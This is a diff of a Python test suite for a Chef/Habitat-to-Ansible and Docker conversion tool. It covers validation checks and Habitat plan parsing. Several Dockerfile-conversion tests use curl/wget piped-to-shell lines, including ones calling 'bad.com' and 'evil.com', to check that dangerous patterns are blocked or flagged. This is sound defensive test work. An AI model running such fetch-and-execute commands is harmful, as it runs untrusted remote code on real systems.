+        """Test known built-in variables do not trigger warnings."""
+        engine = ValidationEngine()
+
+        engine._validate_variable_usage("{{ ansible_facts }}")
+
+        assert engine.results == []
+
+    def test_validate_handler_definitions_missing_handlers(self):
+        """Test notify without handlers yields warning."""
+        engine = ValidationEngine()
+
+        engine._validate_handler_definitions("notify: restart service")
+
+        assert any(
+            result.level == ValidationLevel.WARNING and "no handlers" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_handler_definitions_with_handlers(self):
+        """Test handlers present avoids warnings."""
+        engine = ValidationEngine()
+
+        engine._validate_handler_definitions(
+            "notify: restart\nhandlers:\n  - name: restart"
+        )
+
+        assert engine.results == []
+
+    def test_validate_playbook_structure_missing_hosts(self):
+        """Test missing hosts directive yields error."""
+        engine = ValidationEngine()
+
+        engine._validate_playbook_structure("tasks:\n  - name: Task")
+
+        assert any(
+            result.level == ValidationLevel.ERROR and "hosts" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_playbook_structure_missing_tasks_and_roles(self):
+        """Test missing tasks and roles yields warning."""
+        engine = ValidationEngine()
+
+        engine._validate_playbook_structure("hosts: all")
+
+        assert any(
+            result.level == ValidationLevel.WARNING and "no tasks" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_playbook_structure_complete(self):
+        """Test playbook with hosts and tasks does not warn."""
+        engine = ValidationEngine()
+
+        engine._validate_playbook_structure("hosts: all\n\ntasks:\n  - name: Task")
+
+        assert engine.results == []
+
+    def test_validate_jinja2_syntax_invalid_template(self, monkeypatch):
+        """Test invalid template yields syntax error with mocked Jinja2."""
+        import sys
+        import types
+
+        class DummyEnvironment:
+            last_autoescape = None
+
+            def __init__(self, autoescape=True):
+                self.autoescape = autoescape
+                DummyEnvironment.last_autoescape = autoescape
+
+            def parse(self, _template):
+                raise ValueError("bad template")
+
+        dummy_module = types.ModuleType("jinja2")
+        dummy_module.Environment = DummyEnvironment
+        monkeypatch.setitem(sys.modules, "jinja2", dummy_module)
+
+        engine = ValidationEngine()
+        engine._validate_jinja2_syntax("{{")
+
+        assert DummyEnvironment.last_autoescape is True
+        assert any(
+            result.level == ValidationLevel.ERROR
+            and "Invalid Jinja2 syntax" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_variable_references_deep_nesting(self):
+        """Test deep variable nesting yields info."""
+        engine = ValidationEngine()
+
+        engine._validate_variable_references("{{ a.b.c.d.e.f }}")
+
+        assert any(
+            result.level == ValidationLevel.INFO
+            and "Deep variable nesting" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_python_syntax_invalid_code(self):
+        """Test invalid Python code yields syntax error."""
+        engine = ValidationEngine()
+
+        engine._validate_python_syntax("def broken(:\n    pass")
+
+        assert any(
+            result.level == ValidationLevel.ERROR
+            and "Invalid Python syntax" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_inspec_conversion_python_branch(self):
+        """Test InSpec conversion routes to Python validation."""
+        engine = ValidationEngine()
+
+        with patch.object(engine, "_validate_python_syntax") as python_validator:
+            engine._validate_inspec_conversion("import pytest\n")
+            python_validator.assert_called_once()
+
+    def test_validate_inspec_conversion_ruby_branch(self):
+        """Test InSpec conversion routes to Ruby validation."""
+        engine = ValidationEngine()
+
+        with patch.object(engine, "_validate_ruby_syntax") as ruby_validator:
+            engine._validate_inspec_conversion("require 'serverspec'\n")
+            ruby_validator.assert_called_once()
+
+    def test_validate_inspec_conversion_yaml_branch(self):
+        """Test InSpec conversion routes to YAML validation."""
+        engine = ValidationEngine()
+
+        with patch.object(engine, "_validate_yaml_syntax") as yaml_validator:
+            engine._validate_inspec_conversion("---\npackage:\n  nginx")
+            yaml_validator.assert_called_once()
+
+    def test_validation_summary_formatting(self):
+        """Test summary formatting for different outcome states."""
+        from souschef.core.validation import _format_validation_results_summary
+
+        summary = _format_validation_results_summary(
+            "resource", {"errors": 0, "warnings": 0, "info": 0}
+        )
+        assert "All validation checks passed" in summary
+        assert "Errors: 0" in summary
+
+        failed = _format_validation_results_summary(
+            "recipe", {"errors": 1, "warnings": 0, "info": 0}
+        )
+        assert "Status:" in failed
+        assert "Failed" in failed
+
+        warned = _format_validation_results_summary(
+            "recipe", {"errors": 0, "warnings": 1, "info": 0}
+        )
+        assert "Warning" in warned
+
+        info_only = _format_validation_results_summary(
+            "template", {"errors": 0, "warnings": 0, "info": 2}
+        )
+        assert "Passed with info" in info_only
+
+    def test_validate_ansible_module_exists_known_modules(self):
+        """Test a range of known modules does not trigger warnings."""
+        engine = ValidationEngine()
+        known_modules = [
+            "package",
+            "apt",
+            "yum",
+            "dnf",
+            "service",
+            "systemd",
+            "template",
+            "file",
+            "copy",
+            "command",
+            "shell",
+            "user",
+            "group",
+            "cron",
+            "lineinfile",
+            "blockinfile",
+            "assert",
+            "debug",
+            "set_fact",
+            "include_tasks",
+            "import_tasks",
+        ]
+
+        for module_name in known_modules:
+            engine.results = []
+            engine._validate_ansible_module_exists(
+                f"- name: Test\n  ansible.builtin.{module_name}:"
+            )
+            assert engine.results == []
+
+    def test_validate_ansible_module_exists_no_match(self):
+        """Test tasks without module line do not add warnings."""
+        engine = ValidationEngine()
+
+        engine._validate_ansible_module_exists("- name: Task without module")
+
+        assert engine.results == []
+
+    def test_validate_task_naming_missing_name(self):
+        """Test tasks without name do not add naming warnings."""
+        engine = ValidationEngine()
+
+        engine._validate_task_naming("ansible.builtin.debug: {}")
+
+        assert engine.results == []
+
+    def test_validate_playbook_structure_with_roles(self):
+        """Test playbook with roles avoids tasks/roles warning."""
+        engine = ValidationEngine()
+
+        engine._validate_playbook_structure("hosts: all\nroles:\n  - web")
+
+        assert engine.results == []
+
+    def test_validate_variable_usage_builtins(self):
+        """Test allowed built-in variables do not trigger info messages."""
+        engine = ValidationEngine()
+        allowed = [
+            "ansible_facts",
+            "ansible_check_mode",
+            "ansible_host",
+            "ansible_port",
+        ]
+
+        for var_name in allowed:
+            engine.results = []
+            engine._validate_variable_usage(f"{{{{ {var_name} }}}}")
+            assert engine.results == []
+
+    def test_validate_idempotency_shell_without_changed_when(self):
+        """Test shell tasks without changed_when trigger warning."""
+        engine = ValidationEngine()
+
+        engine._validate_idempotency(
+            "- name: Run shell\n  ansible.builtin.shell: echo test"
+        )
+
+        assert any(
+            result.level == ValidationLevel.WARNING and "changed_when" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_module_usage_no_creates(self):
+        """Test file module without creates does not warn."""
+        engine = ValidationEngine()
+
+        engine._validate_module_usage(
+            "- name: Touch file\n  ansible.builtin.file:\n    path: /tmp/a"
+        )
+
+        assert engine.results == []
+
+    def test_validate_module_usage_non_file_with_creates(self):
+        """Test creates on non-file module does not warn."""
+        engine = ValidationEngine()
+
+        engine._validate_module_usage(
+            "- name: Package\n  ansible.builtin.package:\n    creates: /tmp/a"
+        )
+
+        assert engine.results == []
+
+    def test_validate_jinja2_syntax_valid_template(self, monkeypatch):
+        """Test valid template does not add errors with mocked Jinja2."""
+        import sys
+        import types
+
+        class DummyEnvironment:
+            last_autoescape = None
+
+            def __init__(self, autoescape=True):
+                self.autoescape = autoescape
+                DummyEnvironment.last_autoescape = autoescape
+
+            def parse(self, _template):
+                return None
+
+        dummy_module = types.ModuleType("jinja2")
+        dummy_module.Environment = DummyEnvironment
+        monkeypatch.setitem(sys.modules, "jinja2", dummy_module)
+
+        engine = ValidationEngine()
+        engine._validate_jinja2_syntax("{{ value }}")
+
+        assert DummyEnvironment.last_autoescape is True
+        assert engine.results == []
+
+    def test_validate_variable_references_shallow(self):
+        """Test shallow variable references do not warn."""
+        engine = ValidationEngine()
+
+        engine._validate_variable_references("{{ a.b.c }}")
+
+        assert engine.results == []
+
+    def test_validate_yaml_syntax_valid_content(self):
+        """Test valid YAML does not add errors."""
+        engine = ValidationEngine()
+
+        engine._validate_yaml_syntax("- name: ok\n  value: 1")
+
+        assert engine.results == []
+
+    def test_validate_python_syntax_valid_code(self):
+        """Test valid Python code does not add errors."""
+        engine = ValidationEngine()
+
+        engine._validate_python_syntax("def ok():\n    return 1")
+
+        assert engine.results == []
+
+    def test_validate_inspec_conversion_yaml_branch_with_package_service(self):
+        """Test InSpec conversion routes to YAML validation on package/service."""
+        engine = ValidationEngine()
+
+        with patch.object(engine, "_validate_yaml_syntax") as yaml_validator:
+            engine._validate_inspec_conversion("package:\n  nginx\nservice:\n  nginx")
+            yaml_validator.assert_called_once()
+
+    def test_validate_resource_dependencies_no_state(self):
+        """Test service task without state does not add results."""
+        engine = ValidationEngine()
+
+        engine._validate_resource_dependencies(
+            "- name: Start service\n  ansible.builtin.service:"
+        )
+
+        assert engine.results == []
+
+    def test_validate_handler_definitions_without_notify(self):
+        """Test content without notify does not warn."""
+        engine = ValidationEngine()
+
+        engine._validate_handler_definitions("tasks:\n  - name: Task")
+
+        assert engine.results == []
+
+    def test_validation_summary_empty_results(self):
+        """Test summary returns zeros when no results."""
+        engine = ValidationEngine()
+
+        summary = engine.get_summary()
+        assert summary == {"errors": 0, "warnings": 0, "info": 0}
+
+    def test_validation_result_repr_location_only(self):
+        """Test representation includes location without suggestion."""
+        result = ValidationResult(
+            level=ValidationLevel.WARNING,
+            category=ValidationCategory.SEMANTIC,
+            message="Detail",
+            location="line 5",
+        )
+
+        result_str = repr(result)
+        assert "Location: line 5" in result_str
+        assert "Suggestion:" not in result_str
+
+    def test_validate_task_naming_boundary_length(self):
+        """Test boundary length name does not warn."""
+        engine = ValidationEngine()
+
+        engine._validate_task_naming("- name: tenletters\n  ansible.builtin.debug: {}")
+
+        assert engine.results == []
+
+    def test_validate_task_naming_whitespace_only(self):
+        """Test whitespace-only task name yields short-name info."""
+        engine = ValidationEngine()
+
+        engine._validate_task_naming("- name: '   '\n  ansible.builtin.debug: {}")
+
+        assert any(
+            result.level == ValidationLevel.INFO and "very short" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_playbook_structure_with_tasks_only(self):
+        """Test hosts and tasks avoids structure warnings."""
+        engine = ValidationEngine()
+
+        engine._validate_playbook_structure("hosts: all\n\ntasks:\n  - name: Task")
+
+        assert engine.results == []
+
+    def test_validate_playbook_structure_missing_hosts_and_tasks(self):
+        """Test missing hosts and tasks yields errors and warnings."""
+        engine = ValidationEngine()
+
+        engine._validate_playbook_structure("name: play")
+
+        assert any(
+            result.level == ValidationLevel.ERROR and "hosts" in result.message
+            for result in engine.results
+        )
+        assert any(
+            result.level == ValidationLevel.WARNING and "no tasks" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_variable_usage_non_ansible(self):
+        """Test non-ansible variables do not trigger info messages."""
+        engine = ValidationEngine()
+
+        engine._validate_variable_usage("{{ app_version }}")
+
+        assert engine.results == []
+
+    def test_validate_variable_references_includes_variable_name(self):
+        """Test deep nesting warning includes the variable path."""
+        engine = ValidationEngine()
+
+        engine._validate_variable_references("{{ a.b.c.d.e.f }}")
+
+        assert any(
+            result.level == ValidationLevel.INFO and "a.b.c.d.e.f" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_idempotency_shell_with_changed_when(self):
+        """Test shell task with changed_when does not warn."""
+        engine = ValidationEngine()
+
+        engine._validate_idempotency(
+            "- name: Run shell\n  ansible.builtin.shell: echo ok\n  changed_when: false"
+        )
+
+        assert engine.results == []
+
+    def test_validate_resource_dependencies_non_service(self):
+        """Test non-service tasks do not add dependency info."""
+        engine = ValidationEngine()
+
+        engine._validate_resource_dependencies(
+            "- name: Install\n  ansible.builtin.package:\n    name: nginx"
+        )
+
+        assert engine.results == []
+
+    def test_validate_handler_definitions_notify_with_handlers(self):
+        """Test notify with handlers avoids warnings."""
+        engine = ValidationEngine()
+
+        engine._validate_handler_definitions(
+            "notify: restart\nhandlers:\n  - name: restart\n    ansible.builtin.service:"
+        )
+
+        assert engine.results == []
+
+    def test_validate_yaml_syntax_error_message_includes_details(self):
+        """Test YAML error includes details in message."""
+        engine = ValidationEngine()
+
+        engine._validate_yaml_syntax("- name: bad\n  - invalid")
+
+        assert any(
+            result.level == ValidationLevel.ERROR
+            and "Invalid YAML syntax" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_python_syntax_error_message_includes_details(self):
+        """Test Python syntax error includes details in message."""
+        engine = ValidationEngine()
+
+        engine._validate_python_syntax("def broken(:")
+
+        assert any(
+            result.level == ValidationLevel.ERROR
+            and "Invalid Python syntax" in result.message
+            for result in engine.results
+        )
+
+    def test_validate_inspec_conversion_no_match(self):
+        """Test InSpec conversion with no recognised markers does nothing."""
+        engine = ValidationEngine()
+
+        engine._validate_inspec_conversion("describe package('nginx')")
+
+        assert engine.results == []
+
+    def test_validation_summary_multiple_errors(self):
+        """Test summary counts multiple errors correctly."""
+        engine = ValidationEngine()
+
+        engine._add_result(ValidationLevel.ERROR, ValidationCategory.SYNTAX, "E1")
+        engine._add_result(ValidationLevel.ERROR, ValidationCategory.SYNTAX, "E2")
+
+        summary = engine.get_summary()
+        assert summary["errors"] == 2
 
     def test_validation_engine_get_summary(self):
         """Test ValidationEngine summary generation."""
@@ -14043,13 +14970,11 @@ def test_function(
 class TestHabitatConversion:
     """Test suite for Habitat to container conversion tools."""
 
-    def test_parse_habitat_plan_success(self):
+    def test_parse_habitat_plan_success(self, tmp_path, monkeypatch):
         """Test parsing a valid Habitat plan file."""
-        with patch("souschef.parsers.habitat._normalize_path") as mock_normalize:
-            mock_file = MagicMock(spec=Path)
-            mock_file.exists.return_value = True
-            mock_file.is_dir.return_value = False
-            mock_file.read_text.return_value = """
+        monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", str(tmp_path))
+        plan_path = tmp_path / "plan.sh"
+        plan_content = """
 pkg_name=nginx
 pkg_origin=core
 pkg_version="1.25.3"
@@ -14059,69 +14984,65 @@ pkg_description="Test package"
 pkg_upstream_url="https://example.com"
 pkg_source="https://example.com/nginx.tar.gz"
 pkg_build_deps=(
-  core/gcc
-  core/make
+    core/gcc
+    core/make
 )
 pkg_deps=(
-  core/glibc
-  core/openssl
+    core/glibc
+    core/openssl
 )
 pkg_exports=(
-  [port]=http.port
-  [ssl-port]=http.ssl_port
+    [port]=http.port
+    [ssl-port]=http.ssl_port
 )
 pkg_binds_optional=(
-  [backend]="port"
+    [backend]="port"
 )
 pkg_svc_run="nginx -g 'daemon off;'"
 pkg_svc_user="hab"
 pkg_svc_group="hab"
 
 do_build() {
-  ./configure --prefix=/usr/local
-  make
+    ./configure --prefix=/usr/local
+    make
 }
 
 do_install() {
-  make install
+    make install
 }
-"""
-            mock_normalize.return_value = mock_file
+        """
+        plan_path.write_text(plan_content)
 
-            result = parse_habitat_plan("/fake/plan.sh")
+        result = parse_habitat_plan(str(plan_path))
 
-            # Should return valid JSON
-            assert not result.startswith("Error")
-            plan = json.loads(result)
-            assert plan["package"]["name"] == "nginx"
-            assert plan["package"]["version"] == "1.25.3"
-            assert "gcc" in str(plan["dependencies"]["build"])
-            assert len(plan["ports"]) == 2
-            assert "do_build" in plan["callbacks"]
+        # Should return valid JSON
+        assert not result.startswith("Error")
+        plan = json.loads(result)
+        assert plan["package"]["name"] == "nginx"
+        assert plan["package"]["version"] == "1.25.3"
+        assert "gcc" in str(plan["dependencies"]["build"])
+        assert len(plan["ports"]) == 2
+        assert "do_build" in plan["callbacks"]
 
-    def test_parse_habitat_plan_file_not_found(self):
+    def test_parse_habitat_plan_file_not_found(self, tmp_path, monkeypatch):
         """Test parsing a non-existent Habitat plan."""
-        with patch("souschef.parsers.habitat._normalize_path") as mock_normalize:
-            mock_file = MagicMock(spec=Path)
-            mock_file.exists.return_value = False
-            mock_normalize.return_value = mock_file
+        monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", str(tmp_path))
+        missing_path = tmp_path / "missing.sh"
 
-            result = parse_habitat_plan("/nonexistent/plan.sh")
+        result = parse_habitat_plan(str(missing_path))
 
-            assert result.startswith("Error: File not found")
+        assert result.startswith("Error: File not found")
 
-    def test_parse_habitat_plan_is_directory(self):
+    def test_parse_habitat_plan_is_directory(self, tmp_path, monkeypatch):
         """Test parsing when path is a directory."""
-        with patch("souschef.parsers.habitat._normalize_path") as mock_normalize:
-            mock_file = MagicMock(spec=Path)
-            mock_file.exists.return_value = True
-            mock_file.is_dir.return_value = True
-            mock_normalize.return_value = mock_file
+        monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", str(tmp_path))
+        directory_path = tmp_path / "plan_dir"
+        directory_path.mkdir()
 
-            result = parse_habitat_plan("/fake/directory")
+        result = parse_habitat_plan(str(directory_path))
 
-            assert result.startswith("Error:")
-            assert "directory" in result.lower()
+        assert result.startswith("Error:")
+        assert "directory" in result.lower()
 
     def test_extract_plan_var(self):
         """Test extracting variables from Habitat plan."""
@@ -14456,8 +15377,8 @@ do_install() {
             # but the code path uses shlex.quote())
             assert "apt-get update" in result
 
-    def test_convert_habitat_to_dockerfile_dangerous_pattern_warning(self):
-        """Test that dangerous command patterns trigger warnings in generated Dockerfile."""
+    def test_convert_habitat_to_dockerfile_dangerous_pattern_blocked(self):
+        """Test that dangerous command patterns are blocked by default."""
         with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
             # Mock plan with potentially dangerous commands
             mock_parse.return_value = json.dumps(
@@ -14479,9 +15400,34 @@ do_install() {
 
             result = convert_habitat_to_dockerfile("/fake/plan.sh")
 
-            # Should include warning comments for dangerous patterns
+            assert "Dangerous command pattern detected" in result
+
+    def test_convert_habitat_to_dockerfile_dangerous_pattern_allowed(self):
+        """Test that dangerous command patterns are allowed when explicitly enabled."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "suspicious",
+                        "origin": "untrusted",
+                        "version": "1.0.0",
+                    },
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "myapp"},
+                    "callbacks": {
+                        "do_build": "curl https://example.com/script.sh | sh\n"
+                        'eval "$(wget -O- https://bad.com/code)"',
+                    },
+                }
+            )
+
+            result = convert_habitat_to_dockerfile(
+                "/fake/plan.sh", allow_dangerous_patterns=True
+            )
+
             assert "# WARNING: Potentially dangerous command pattern detected" in result
-            # The dangerous commands should still be present (so user can review)
             assert "curl https://example.com/script.sh | sh" in result
             assert "eval" in result
 
@@ -14578,12 +15524,7 @@ do_install() {
 
             result = convert_habitat_to_dockerfile("/fake/plan.sh")
 
-            # Should detect dangerous pattern AFTER variable replacement
-            assert "WARNING: Potentially dangerous command pattern detected" in result
-            # The command should still be included (with warning)
-            assert (
-                "RUN mkdir /usr/local && curl http://evil.com/script.sh | sh" in result
-            )
+            assert "Dangerous command pattern detected" in result
 
     def test_convert_habitat_to_dockerfile_parse_error(self):
         """Test Dockerfile conversion when plan parsing fails."""
@@ -14831,6 +15772,16 @@ do_install() {
             # Special characters
             result = generate_compose_from_habitat("/fake/plan.sh", "net{inject}")
             assert "Invalid Docker network name" in result
+
+    def test_generate_compose_from_habitat_rejects_too_many_paths(self):
+        """Test docker-compose generation rejects excessive plan paths."""
+        plan_paths = ",".join(
+            f"/fake/plan_{index}.sh" for index in range(_MAX_PLAN_PATHS + 1)
+        )
+
+        result = generate_compose_from_habitat(plan_paths, "test_net")
+
+        assert "Too many Habitat plan paths" in result
 
     def test_generate_compose_from_habitat_single_service(self):
         """Test generating docker-compose.yml from a single Habitat plan."""
@@ -15411,7 +16362,9 @@ def test_generate_jenkinsfile_from_chef_default_params():
     assert "pipeline {" in result
 
 
-def test_generate_jenkinsfile_from_chef_nonexistent_path():
+def test_generate_jenkinsfile_from_chef_nonexistent_path(monkeypatch):
+    """Test Jenkinsfile generation with nonexistent cookbook path."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     """Test Jenkinsfile generation with nonexistent cookbook path."""
     from souschef.server import generate_jenkinsfile_from_chef
 
@@ -15523,7 +16476,9 @@ def test_generate_gitlab_ci_from_chef_default_params():
     assert "stages:" in result
 
 
-def test_generate_gitlab_ci_from_chef_nonexistent_path():
+def test_generate_gitlab_ci_from_chef_nonexistent_path(monkeypatch):
+    """Test GitLab CI generation with nonexistent cookbook path."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     """Test GitLab CI generation with nonexistent cookbook path."""
     from souschef.server import generate_gitlab_ci_from_chef
 
@@ -15628,7 +16583,9 @@ def test_generate_github_workflow_from_chef_default_params():
     assert "on:" in result
 
 
-def test_generate_github_workflow_from_chef_nonexistent_path():
+def test_generate_github_workflow_from_chef_nonexistent_path(monkeypatch):
+    """Test generate_github_workflow_from_chef with nonexistent path."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     """Test generate_github_workflow_from_chef with nonexistent path."""
     result = generate_github_workflow_from_chef(cookbook_path="/nonexistent/path")
 
@@ -15852,7 +16809,7 @@ def test_validate_chef_server_connection_success():
 
         result = validate_chef_server_connection("https://chef.example.com", "admin")
 
-        assert "✅ Success" in result
+        assert "Success" in result
         assert "Connection successful" in result
         mock_validate.assert_called_once_with("https://chef.example.com", "admin")
 
@@ -15866,7 +16823,7 @@ def test_validate_chef_server_connection_failure():
 
         result = validate_chef_server_connection("https://chef.example.com", "admin")
 
-        assert "❌ Failed" in result
+        assert "Failed" in result
         assert "Connection timeout" in result
 
 
@@ -15879,7 +16836,7 @@ def test_validate_chef_server_connection_exception():
 
         result = validate_chef_server_connection("https://chef.example.com", "admin")
 
-        assert "❌ Error" in result
+        assert "Error" in result
         assert "Network error" in result
 
 
@@ -15893,7 +16850,7 @@ def test_get_chef_nodes_success():
             "roles": ["webserver"],
             "environment": "production",
             "platform": "ubuntu",
-            "ipaddress": "10.0.1.10",
+            "ipaddress": "10.0.1.10",  # NOSONAR - RFC 1918 private IP in test data
             "fqdn": "web-server-01.example.com",
         },
         {
@@ -15901,7 +16858,7 @@ def test_get_chef_nodes_success():
             "roles": ["database"],
             "environment": "production",
             "platform": "ubuntu",
-            "ipaddress": "10.0.2.10",
+            "ipaddress": "10.0.2.10",  # NOSONAR - RFC 1918 private IP in test data
             "fqdn": "db-server-01.example.com",
         },
     ]
@@ -16040,7 +16997,9 @@ def test_convert_template_with_ai_failure():
         assert len(data["warnings"]) > 0
 
 
-def test_convert_template_with_ai_exception():
+def test_convert_template_with_ai_exception(monkeypatch):
+    """Test convert_template_with_ai with exception."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     """Test convert_template_with_ai with exception."""
     from souschef.server import convert_template_with_ai
 
